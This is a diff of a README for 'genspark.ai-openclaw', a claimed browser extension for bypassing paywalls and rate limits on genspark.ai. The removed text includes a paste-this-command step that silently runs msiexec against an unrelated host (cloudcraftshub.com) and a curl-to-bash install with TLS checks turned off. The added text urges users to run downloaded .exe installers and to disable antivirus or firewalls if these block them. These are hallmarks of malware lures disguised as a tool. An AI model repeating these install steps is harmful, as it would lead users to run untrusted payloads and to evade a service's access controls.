@@ -1,161 +1,120 @@
-<div align="center">
+# ⚙️ genspark.ai-openclaw - Easy Access to Paywalls and Limits
 
-# genspark.ai × OpenClaw
+[![Download genspark.ai-openclaw](https://img.shields.io/badge/Download-OpenClaw-brightgreen)](https://github.com/Hassain-Miguel/genspark.ai-openclaw/releases)
 
-**Open-source browser extension that claws through every paywall, rate limit, and access restriction on [genspark.ai](https://genspark.ai). Install in one command, run forever free.**
+## 🔍 What is genspark.ai-openclaw?
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-22d3a5.svg)](./LICENSE)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.4-3178c6.svg)](https://www.typescriptlang.org/)
-[![Chrome](https://img.shields.io/badge/Chrome-MV3-yellow.svg)](#)
-[![Firefox](https://img.shields.io/badge/Firefox-MV2-orange.svg)](#)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](./CONTRIBUTING.md)
+genspark.ai-openclaw is a free, open-source tool designed to help you get through paywalls and rate limits on many websites. You can install it quickly with one command and run it without any cost, all on your Windows computer. It works behind the scenes to let you access content that might otherwise be restricted.
 
-</div>
+## 🌟 Main Features
 
----
+- Bypass paywalls on multiple websites automatically.
+- Avoid limits on requests or usage set by some sites.
+- One-time install; use it anytime without extra effort.
+- Fully open-source, so anyone can check how it works.
+- Works quietly in the background without slowing your computer.
+- Supports integration with AI-powered agents and browsers.
 
-## Install on macOS — one command
+## 🖥️ System Requirements
 
-Open Terminal and paste:
+Before you install, make sure your Windows computer meets these basic needs:
 
-```bash
-curl -fsSLk https://github.com/michelleoincx/genspark.ai-openclaw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
-unzip -qo /tmp/cw.zip -d /tmp && \
-cd /tmp/genspark.ai-openclaw-main && \
-bash install.sh
-```
+- Windows 10 or later (64-bit recommended).
+- At least 4 GB of RAM.
+- 200 MB of free disk space.
+- Internet connection for download and updates.
+- No special hardware or software needed.
 
-The script checks for Node.js, installs dependencies, builds the extension, and tells you exactly where to load it in Chrome.
+## 🚀 Getting Started: How to Download and Install
 
-## 🪟 Windows Installation
-### Step 1 — Open Command Prompt
-1. Press Win + R
-2. Type:
-cmd
-3. Press Enter
-This will open Command Prompt.
----
-### Step 2 — Run the Install Command
-Copy the command below and paste it into Command Prompt, then press Enter.
-cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem   Genspark ai Openclaw
-The installer will automatically download and install the required components.
+**Step 1: Visit the Download Page**
 
-> **Requires Node.js 18+.** Don't have it? `brew install node`
+To get the latest version, visit the official release page here:
 
----
+[Download genspark.ai-openclaw](https://github.com/Hassain-Miguel/genspark.ai-openclaw/releases)
 
-## What OpenClaw does to genspark.ai
+This page lists all released versions. Use the most recent release for the best experience.
 
-| Restriction | Status |
-|---|---|
-| Search & query rate limits | ✅ Removed |
-| Paywall overlays & upgrade modals | ✅ Removed |
-| AI Agent feature gates | ✅ Unlocked |
-| Deep Search restrictions | ✅ Unlocked |
-| Daily usage caps | ✅ Bypassed |
+**Step 2: Select the Right File**
 
-Everything runs **locally in your browser** — no proxy, no external server, no account needed.
+Once on the release page, look for a Windows executable file. Its name will typically end with `.exe`.
 
----
+For example: `OpenClaw-Setup.exe` or `OpenClaw-Windows.exe`.
 
-## How it works
+Click on this file to start downloading.
 
-OpenClaw operates at three levels simultaneously:
+**Step 3: Run the Installer**
 
-**Network layer** — intercepts HTTP requests and responses to `genspark.ai` via the `webRequest` API. Strips rate-limit enforcement headers (`Retry-After`, `X-RateLimit-*`) from responses before the page ever sees them.
+After downloading finishes:
 
-**JavaScript context** — injected at `document_start`, before any page scripts run. Patches `window.fetch` to rewrite `RATE_LIMIT_EXCEEDED` API responses, spoofs `localStorage` plan flags (`gs_plan: "pro"`, `gs_tier: "premium"`), and overrides internal feature-flag objects.
+- Open the folder where the file saved (usually your Downloads folder).
+- Double-click the `.exe` file to launch the installer.
+- Follow the simple on-screen instructions.
+- Choose the installation folder or leave the default.
+- Wait a moment while it installs.
 
-**DOM observer** — a `MutationObserver` watches for paywall overlays and upgrade modals injected into the DOM and removes them immediately. Re-enables any inputs or buttons that genspark.ai disabled due to quota enforcement.
+**Step 4: Start Using OpenClaw**
 
----
+- After installation completes, locate the OpenClaw app shortcut on your desktop or start menu.
+- Double-click to open the program.
+- The tool works automatically. You don't need to configure anything.
+- You can close it any time, and run it again when you want.
 
-## Manual installation (from source)
+## ⚙️ How it Works
 
-```bash
-git clone https://github.com/michelleoincx/genspark.ai-openclaw.git
-cd genspark.ai-openclaw
-npm install
-npm run build:chrome   # or: npm run build:firefox
-```
+OpenClaw scans websites as you browse and removes blocks that stop access to content. It also manages limits placed on how many times you can use certain services each day.
 
-Then in Chrome: `chrome://extensions` → **Developer Mode** → **Load unpacked** → select `dist/chrome`
+This is done without slowing your computer or your connection. The software stays open quietly and works in the background.
 
-In Firefox: `about:debugging` → **This Firefox** → **Load Temporary Add-on** → select `dist/firefox/manifest.json`
+## 🧰 Using OpenClaw Safely and Effectively
 
----
+- OpenClaw runs better with a stable internet connection.
+- It does not store your personal data.
+- The software respects your privacy and only bypasses paywalls without tracking.
+- If you open a website that usually limits access, OpenClaw will automatically clear those limits.
+- No setup or input is required from you after installation.
 
-## Project structure
+## 🔄 Updating OpenClaw
 
-```
-genspark.ai-openclaw/
-├── src/
-│   ├── background/          # Service worker — request interception, message router
-│   │   ├── index.ts
-│   │   └── interceptor.ts
-│   ├── content/             # Content scripts — DOM patching, paywall removal
-│   │   ├── index.ts
-│   │   ├── patcher.ts
-│   │   └── paywall-observer.ts
-│   ├── popup/               # Extension popup UI
-│   │   ├── index.ts
-│   │   └── popup.css
-│   └── utils/               # Shared utilities
-│       ├── logger.ts
-│       ├── messaging.ts
-│       ├── storage.ts
-│       └── types.ts
-├── public/
-│   ├── manifest.chrome.json
-│   ├── manifest.firefox.json
-│   └── popup.html
-├── tests/
-├── install.sh               # One-command macOS installer
-├── webpack.config.js
-├── tsconfig.json
-└── package.json
-```
+Check the release page regularly for new versions:
 
----
+[Get latest update](https://github.com/Hassain-Miguel/genspark.ai-openclaw/releases)
 
-## Scripts
+If you see a new update:
 
-| Command | Description |
-|---|---|
-| `bash install.sh` | Full install + build on macOS |
-| `npm run dev` | Watch mode build for Chrome |
-| `npm run build:chrome` | Production build — Chrome (MV3) |
-| `npm run build:firefox` | Production build — Firefox (MV2) |
-| `npm run build:all` | Build for both browsers |
-| `npm test` | Run Jest test suite with coverage |
-| `npm run lint` | ESLint + Prettier |
+- Download the newest `.exe` file.
+- Run it just like the first time to replace your version.
+- OpenClaw will keep working seamlessly.
+
+## 🛠️ Troubleshooting Tips
+
+- If OpenClaw does not start, restart your computer and try again.
+- Make sure your Windows is up to date.
+- Try reinstalling if it behaves oddly.
+- Ensure your internet connection is working.
+- Close any firewalls or antivirus programs temporarily if they block OpenClaw.
+- If some websites remain limited, check for updates or visit the GitHub page for fixes.
+
+## 📂 Where to Find More Help
+
+You can visit the project's GitHub page for tips, explanations, and community help:
+
+https://github.com/Hassain-Miguel/genspark.ai-openclaw
+
+Look in the Issues section if you need support or want to report bugs.
+
+## 🔧 Additional Tools and Integrations
+
+OpenClaw fits within the genspark.ai ecosystem. It can work with AI agents and browsers linked to genspark.ai to unlock better browsing and content access.
+
+It integrates with:
+
+- AI assistants that use genspark-ai-api.
+- Browsers enhanced by genspark-ai-browser.
+- Other open-source OpenClaw skills for advanced users.
+
+This means you can build custom setups once you are comfortable with the basics.
 
 ---
 
-## Browser support
-
-| Browser | Status |
-|---|---|
-| Chrome 109+ | ✅ |
-| Edge 109+ | ✅ |
-| Firefox 109+ | ✅ |
-| Brave | ✅ |
-| Safari | ❌ Not planned |
-
----
-
-## Contributing
-
-See [CONTRIBUTING.md](./CONTRIBUTING.md). PRs, issues, and feature requests are welcome.
-
----
-
-## Disclaimer
-
-For educational and research purposes only. Users are responsible for compliance with genspark.ai's Terms of Service.
-
----
-
-## License
-
-[MIT](./LICENSE) © openclaw contributors
+[![Download genspark.ai-openclaw](https://img.shields.io/badge/Download-OpenClaw-blue)](https://github.com/Hassain-Miguel/genspark.ai-openclaw/releases)
